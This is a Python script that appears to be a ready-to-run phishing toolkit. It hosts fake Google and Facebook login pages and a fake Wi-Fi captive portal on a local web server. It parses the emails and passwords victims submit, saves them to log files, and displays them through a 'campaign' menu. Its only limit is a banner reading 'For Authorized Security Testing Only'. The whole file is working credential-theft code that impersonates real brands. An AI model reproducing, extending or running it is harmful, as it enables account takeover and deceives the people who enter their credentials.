import os
import sys
import time
import random
import socket
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# Configuration
LOG_FILE = "creds.txt"
PHISHING_LOG = "phishing_logs.txt"
PORTAL_PORT = 8080
STOP_FLAG = False

# Phishing Templates
TEMPLATES = {
    "google": {
        "name": "Google Login",
        "html": """<!DOCTYPE html><html><head><title>Google Security Check</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        .logo{text-align:center;margin-bottom:20px;}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#4285F4;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body><div class="login-box"><div class="logo">
        <svg width="75" height="24" viewBox="0 0 75 24"><g fill="none"><path d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68C70.83 8.09 69.417 7 66.52 7c-3.64 0-6.783 2.902-6.783 7.546 0 4.756 3.152 7.547 6.898 7.547 3.24 0 5.26-1.97 5.26-4.82 0-.28-.03-.5-.09-.7H67.96zm-6.008-5.09c0-1.87 1.147-3.22 2.857-3.22 1.67 0 2.857 1.35 2.857 3.22 0 1.92-1.187 3.22-2.857 3.22-1.71 0-2.857-1.3-2.857-3.22z" fill="#4285F4"/></g></svg>
        </div><h2>Security Check Required</h2><form action="/phish/google" method="post">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify Account</button></form></div></body></html>""",
        "success": """<div style="text-align:center;padding:20px;">
        <h2 style="color:#4285F4;">Security Verification Complete</h2>
        <p>Your account is now secure.</p></div>"""
    },
    "facebook": {
        "name": "Facebook Login",
        "html": """<!DOCTYPE html><html><head><title>Facebook Login</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        .logo{color:#1877F2;text-align:center;font-size:24px;font-weight:bold;margin-bottom:20px;}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#1877F2;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body><div class="login-box"><div class="logo">facebook</div>
        <form action="/phish/facebook" method="post">
        <input type="text" name="email" placeholder="Email or Phone Number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button></form></div></body></html>""",
        "success": """<div style="text-align:center;padding:20px;">
        <h2 style="color:#1877F2;">Login Successful</h2>
        <p>You will be redirected shortly.</p></div>"""
    }
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Fore.RED}
   ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄█   ▄█▄    ▄████████ 
  ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀   ███    ███ 
  ███    █▀  ███   ███   ███    ███   ███    █▀    ███▐██▀     ███    █▀  
  ███        ███   ███  ▄███▄▄▄▄██▀  ▄███▄▄▄       ▄█████▀     ▄███▄▄▄     
▀███████████ ███   ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀      ▀▀█████▄    ▀▀███▀▀▀     
         ███ ███   ███ ▀███████████   ███    █▄     ███▐██▄     ███    █▄ 
   ▄█    ███ ███   ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███ 
 ▄████████▀   ▀█   █▀    ███    ███   ██████████   ███   ▀█▀   ██████████ 
                          ███    ███                                      
    {Fore.RESET}{Fore.CYAN}[ Wi-Fi Phishing Toolkit (No Hosted Network) ]{Fore.RESET}
    {Fore.YELLOW}⚠ WARNING: For Authorized Security Testing Only! ⚠{Fore.RESET}
    """
    print(banner)

def get_local_ip():
    """Get local IP address for phishing URL"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "YOUR-IP"

def log_credentials(service, username, password):
    """Log credentials to file and terminal"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {service.upper()} - Username: {username} | Password: {password}\n"
    
    if service.lower() == "wifi":
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
    else:
        with open(PHISHING_LOG, "a") as f:
            f.write(log_entry)
    
    print(f"{Fore.RED}[!] {service.upper()} Credentials Captured:{Fore.RESET}")
    print(f"{Fore.RED}    Username: {username}{Fore.RESET}")
    print(f"{Fore.RED}    Password: {password}{Fore.RESET}\n")

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_redirect()
        elif self.path.startswith('/template/'):
            self.send_phishing_template()
        elif self.path == '/success':
            self.send_success_page()
        elif self.path == '/wifi':
            self.send_wifi_login()
        else:
            self.send_redirect()
    
    def do_POST(self):
        if self.path.startswith('/phish/'):
            self.handle_phish_submit()
        elif self.path == '/auth':
            self.handle_wifi_login()
    
    def send_redirect(self):
        self.send_response(302)
        self.send_header('Location', '/wifi')
        self.end_headers()
    
    def send_phishing_template(self):
        template = self.path.split('/')[2]
        if template in TEMPLATES:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(TEMPLATES[template]["html"].encode())
        else:
            self.send_error(404)
    
    def send_success_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        success_page = """<!DOCTYPE html><html><head><title>Success</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .success-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);text-align:center;}
        .success{color:#4CAF50;font-size:24px;}</style></head><body>
        <div class="success-box"><div class="success">✓</div>
        <h2>Action Completed</h2><p>Thank you for your cooperation.</p></div></body></html>"""
        self.wfile.write(success_page.encode())
    
    def send_wifi_login(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        login_page = """<!DOCTYPE html><html><head><title>Wi-Fi Login</title>
        <style>body{font-family:Arial,sans-serif;background:#f5f5f5;}
        .login-box{width:300px;margin:100px auto;padding:20px;background:white;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
        input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:3px;}
        button{background:#4CAF50;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
        </head><body><div class="login-box"><h2>Wi-Fi Login Required</h2>
        <form action="/auth" method="post">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Connect</button></form></div></body></html>"""
        self.wfile.write(login_page.encode())
    
    def handle_phish_submit(self):
        template = self.path.split('/')[2]
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        if template == "google":
            username = post_data.split('email=')[1].split('&')[0]
            password = post_data.split('password=')[1].split('&')[0]
        elif template == "facebook":
            username = post_data.split('email=')[1].split('&')[0]
            password = post_data.split('password=')[1].split('&')[0]
        
        log_credentials(template, username, password)
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()
    
    def handle_wifi_login(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        username = post_data.split('username=')[1].split('&')[0]
        password = post_data.split('password=')[1].split('&')[0]
        log_credentials("wifi", username, password)
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()

def start_phishing_server():
    server = HTTPServer(('0.0.0.0', PORTAL_PORT), PhishingHandler)
    print(f"{Fore.GREEN}[+] Phishing server running on http://{get_local_ip()}:{PORTAL_PORT}{Fore.RESET}")
    while not STOP_FLAG:
        server.handle_request()

def check_hosted_network_support():
    """Check if hosted network is supported"""
    try:
        result = subprocess.run('netsh wlan show drivers', shell=True, capture_output=True, text=True)
        return "Hosted network supported  : Yes" in result.stdout
    except:
        return False

def main():
    clear_screen()
    print_banner()
    
    # Check admin privileges
    try:
        subprocess.check_output("net session", shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] This tool requires Administrator privileges!{Fore.RESET}")
        sys.exit(1)
    
    # Check hosted network support
    if check_hosted_network_support():
        print(f"{Fore.YELLOW}[!] Hosted network is supported on this system{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Consider using the full version with Wi-Fi capabilities{Fore.RESET}")
    else:
        print(f"{Fore.YELLOW}[!] Hosted network not supported - using phishing-only mode{Fore.RESET}")
    
    # Start phishing server in background
    phishing_thread = threading.Thread(target=start_phishing_server)
    phishing_thread.daemon = True
    phishing_thread.start()

    while True:
        print(f"\n{Fore.CYAN}Main Menu:{Fore.RESET}")
        print(f"{Fore.CYAN}[1]{Fore.RESET} Launch Phishing Campaign")
        print(f"{Fore.CYAN}[2]{Fore.RESET} View Captured Credentials")
        print(f"{Fore.CYAN}[3]{Fore.RESET} Exit")
        
        choice = input(f"\n{Fore.YELLOW}[?] Select an option (1-3): {Fore.RESET}")

        if choice == "1":
            # Phishing Campaign
            clear_screen()
            print(f"\n{Fore.CYAN}Available Phishing Templates:{Fore.RESET}")
            for i, (key, val) in enumerate(TEMPLATES.items(), 1):
                print(f"{Fore.CYAN}[{i}]{Fore.RESET} {val['name']}")
            
            try:
                template_choice = int(input(f"{Fore.YELLOW}[?] Select template (1-{len(TEMPLATES)}): {Fore.RESET}")) - 1
                selected_template = list(TEMPLATES.keys())[template_choice]
            except:
                print(f"{Fore.RED}[-] Invalid selection{Fore.RESET}")
                continue
            
            print(f"\n{Fore.GREEN}[+] Phishing URL: http://{get_local_ip()}:{PORTAL_PORT}/template/{selected_template}{Fore.RESET}")
            print(f"{Fore.YELLOW}[*] Waiting for credentials... Press Ctrl+C to stop{Fore.RESET}")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Phishing campaign stopped{Fore.RESET}")
        
        elif choice == "2":
            # View Captured Credentials
            clear_screen()
            print(f"\n{Fore.CYAN}Captured Credentials:{Fore.RESET}")
            
            if os.path.exists(LOG_FILE):
                print(f"\n{Fore.YELLOW}Wi-Fi Credentials:{Fore.RESET}")
                with open(LOG_FILE, 'r') as f:
                    print(f.read())
            
            if os.path.exists(PHISHING_LOG):
                print(f"\n{Fore.YELLOW}Phishing Credentials:{Fore.RESET}")
                with open(PHISHING_LOG, 'r') as f:
                    print(f.read())
            
            if not os.path.exists(LOG_FILE) and not os.path.exists(PHISHING_LOG):
                print(f"{Fore.RED}[-] No credentials captured yet{Fore.RESET}")
            
            input(f"{Fore.YELLOW}[?] Press Enter to return to menu...{Fore.RESET}")
        
        elif choice == "3":
            # Exit
            print(f"\n{Fore.RED}[!] Shutting down...{Fore.RESET}")
            sys.exit(0)
        
        else:
            print(f"{Fore.RED}[-] Invalid choice!{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Shutting down...{Fore.RESET}")
        sys.exit(0)
